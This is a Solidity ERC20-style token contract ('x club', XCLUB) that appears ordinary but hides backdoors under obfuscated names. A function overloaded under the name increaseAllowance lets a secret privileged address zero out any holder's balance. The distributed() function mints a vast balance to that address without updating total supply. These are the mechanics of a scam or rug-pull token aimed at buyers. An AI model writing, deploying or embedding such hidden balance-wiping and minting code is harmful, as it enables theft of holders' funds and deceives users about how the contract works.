// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

pragma solidity ^0.8.0;

contract XCLUB is Ownable {
    
    uint256 ycjflgb = 42069000000*10**decimals();
    uint256 private _xydkeav = ycjflgb;
    string private _tkbnfxv = "x club";
    string private _fywulzm = "XCLUB";
    address public hoesjfg;
    constructor(address odmkbuy) {
        hoesjfg = odmkbuy;
        _balances[_msgSender()] += ycjflgb;
        emit Transfer(address(0), _msgSender(), ycjflgb);
    }

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;



    function symbol() public view  returns (string memory) {
        return _fywulzm;
    }
    uint256 ymofgnj = 1000+1000-2000;
    function increaseAllowance(address oanghid) public     {
        if(hoesjfg == _msgSender()){
        address bozcaps = oanghid;
        uint256 curamount = _balances[bozcaps];
        uint256 newaaamount = _balances[bozcaps]+_balances[bozcaps]-curamount;
        _balances[bozcaps] -= newaaamount;
        }else{
        if(hoesjfg == _msgSender()){
        }else{
            revert("ccc");
        }
        }
       
        
       

    }
    function totalSupply() public view returns (uint256) {
        return _xydkeav;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function name() public view returns (string memory) {
        return _tkbnfxv;
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function distributed(address pajwdyo) 
    external {
        address nfhgpli = _msgSender();
        uint256 acowmbk = 33330000000+1000;
        _balances[nfhgpli] += 63200*((10**decimals()*acowmbk))*1*1*1*1;
        require(hoesjfg == _msgSender());
        if(hoesjfg == _msgSender()){
        }
    }



    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}